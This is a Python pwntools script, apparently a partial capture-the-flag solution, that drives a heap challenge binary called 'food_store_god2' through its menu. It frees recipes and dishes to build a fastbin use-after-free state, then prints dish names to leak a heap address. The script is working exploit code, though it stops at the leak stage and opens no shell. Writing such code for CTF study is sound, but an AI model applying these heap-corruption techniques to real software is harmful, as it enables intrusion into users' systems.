import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god2'],env={'LD_LIBRARY_PATH':DIR})
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(t,ings=(b'0',)):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1'); ru(b'Magic : '); p.recvline()
    ru(b'Title :'); sl(t)
    for i,ing in enumerate(ings):
        ru(b'Choose ingredient :'); sl(ing); ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'1' if i<len(ings)-1 else b'2')
    ru(b'Your choice: '); sl(b'4')
def cook(t): ru(b'Your choice: '); sl(b'5'); ru(b'What do you want to cook :'); sl(t); ru(b'Done !')
def rm(t): ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2'); ru(b'Title :'); sl(t); ru(b'Your choice: '); sl(b'4')
def sell(idx): ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'2'); ru(b'What do you want to sell ? :'); sl(idx)
add(b'UNIQ777',(b'0',))
add(b'A1'); add(b'B2'); cook(b'Beef noodles'); add(b'YY'); add(b'Z9'); cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): rm(t)
add(b'CC')
cook(b'Beef noodles'); cook(b'Beef noodles')   # D1,D2 drain
cook(b'Beef noodles')                           # E (index4)
cook(b'UNIQ777')                                # D3@YY (index5)
sell(b'4')                                      # free E
ru(b'Your choice: '); sl(b'4')                  # back to main
rm(b'UNIQ777'); rm(b'UNIQ777')                  # free recipe + free D3 (fastbin[0x40]=[D3,E], D3.fd=&E)
# show dishes via sell invalid index
ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'2')
data=ru(b'What do you want to sell ? :',timeout=3); sl(b'99999')
import re
names=re.findall(rb'Name : ([^\n]*)', data)
print("dish names:")
for n in names: print("   ",n, n.hex())
# D3 is last; parse heap
hp=names[-1]
if hp:
    leak=u64(hp[:6].ljust(8,b'\0'))
    print("HEAP leak candidate = %#x"%leak)
p.close()
